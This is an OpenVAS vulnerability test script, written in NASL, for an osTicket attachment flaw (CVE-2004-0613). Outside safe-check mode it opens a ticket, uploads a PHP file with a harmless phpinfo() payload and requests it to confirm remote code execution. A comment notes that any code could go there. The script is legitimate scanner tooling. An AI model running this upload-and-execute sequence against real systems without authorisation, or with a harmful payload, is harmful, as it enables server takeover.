###############################################################################
# OpenVAS Vulnerability Test
# $Id: osticket_attachment_code_execution.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# osTicket Attachment Code Execution Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:osticket:osticket";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.13645");
  script_version("$Revision: 13679 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(10586);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2004-0613");
  script_name("osTicket Attachment Code Execution Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("osticket_detect.nasl");
  script_mandatory_keys("osticket/installed");

  script_tag(name:"solution", value:"Apply FileTypes patch or upgrade to osTicket STS 1.2.7 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of osTicket that enables a
  remote user to open a new ticket with an attachment containing arbitrary PHP code and then to run that
  code using the permissions of the web server user.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

if( ! port  = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) ) exit(0);
vers = infos['version'];
dir  = infos['location'];

# If safe_checks are enabled, rely on the version number alone.
# nb: this will be a false positive if the patch was applied!
if( safe_checks() ) {
  if( vers && ereg(pattern:"^1\.2\.5$", string:vers ) ) {
    report = report_fixed_ver( installed_version:vers, fixed_version:"1.2.7", install_path:dir  );
    security_message( port:port, data:report );
    exit( 0 );
  }
} else {

  if( dir == "/" ) dir = "";
  url = dir + "/open.php";
  req = http_get( item:url, port:port);
  res = http_keepalive_send_recv( port:port, data:req );
  if( isnull( res ) ) exit( 0 );

  host = http_host_name( port:port );
  mailHost = get_host_name();
  if( http_get_no404_string( port:port, host:mailHost ) ) exit( 0 );

  # If the form supports attachments...
  if( egrep( pattern:'type="file" name="attachment"', string:res, icase:TRUE ) ) {
    #  Grab the session cookie.
    pat = "Set-Cookie: (.+); path=";
    matches = egrep( pattern:pat, string:res, icase:TRUE );
    foreach match( split( matches ) ) {
      match = chomp( match );
      cookie = eregmatch( pattern:pat, string:match );
      if( isnull( cookie ) ) break;
      cookie = cookie[1];
    }

    # Open a ticket as long as we have a session cookie.
    if( cookie ) {
      boundary = "bound";
      req = string("POST ",  url, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Cookie: ", cookie, "\r\n",
                   "Content-Type: multipart/form-data; boundary=", boundary, "\r\n");
                   # nb: we'll add the Content-Length header and post data later.
      boundary = string("--", boundary);
      postdata = string(boundary, "\r\n",
                       'Content-Disposition: form-data; name="name"', "\r\n",
                       "\r\n",
                       "vttest\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="email"', "\r\n",
                       "\r\n",
                       "postmaster@", mailHost, "\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="phone"', "\r\n",
                       "\r\n",
                       "\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="cat"', "\r\n",
                       "\r\n",
                       "4\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="subject"', "\r\n",
                       "\r\n",
                       "Attachment Upload Test\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="message"', "\r\n",
                       "\r\n",
                       "Attempt to open a ticket and attach a file with executable code.\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="pri"', "\r\n",
                       "\r\n",
                       "1\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
                       "\r\n",
                       "1048576\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="attachment"; filename="exploit.php"', "\r\n",
                       "Content-Type: text/plain\r\n",
                       "\r\n",
                       # NB: This is the actual exploit code; you could put pretty much anything you want here.
                       "<?php phpinfo() ?>\r\n",
                       boundary, "\r\n",
                       'Content-Disposition: form-data; name="submit_x"', "\r\n",
                       "\r\n",
                       "Open Ticket\r\n",
                       boundary, "--", "\r\n");

      req = string(req,
                   "Content-Length: ", strlen(postdata), "\r\n",
                   "\r\n",
                   postdata);
      res = http_keepalive_send_recv( port:port, data:req );
      if( isnull( res ) ) exit( 0 );

      # Grab the ticket number that was issued.
      pat = 'name="login_ticket" .+ value="(.+)">';
      if( matches = egrep(pattern:pat, string:res, icase:TRUE ) ) {
        foreach match( split( matches ) ) {
          match = chomp( match );
          ticket = eregmatch( pattern:pat, string:match );
          if( isnull( ticket ) ) break;
          ticket = ticket[1];
        }
        if( ticket ) {
          # Run the attachment we just uploaded.
          url = string( dir, "/attachments/", ticket, "_exploit.php" );
          req = http_get( item:url, port:port );
          res = http_keepalive_send_recv( port:port, data:req );
          if( isnull( res ) ) exit( 0 );

          # If we could run it, there's a problem.
          if( egrep( pattern:"^HTTP/1\.[01] 200", string:res, icase:TRUE ) ) {
            desc = "**** The Scanner successfully opened ticket #" + ticket + " and uploaded\n" +
                   "**** an exploit as " + ticket + "_exploit.php to osTicket's attachment\n" +
                   "**** directory. You are strongly encouraged to delete this attachment\n" +
                   "**** as soon as possible as it can be run by anyone who accesses.\n" +
                   "**** it remotely.";
            security_message( port:port, data:desc );
            exit( 0 );
          }
        }
      }
    }
  }
}

exit( 99 );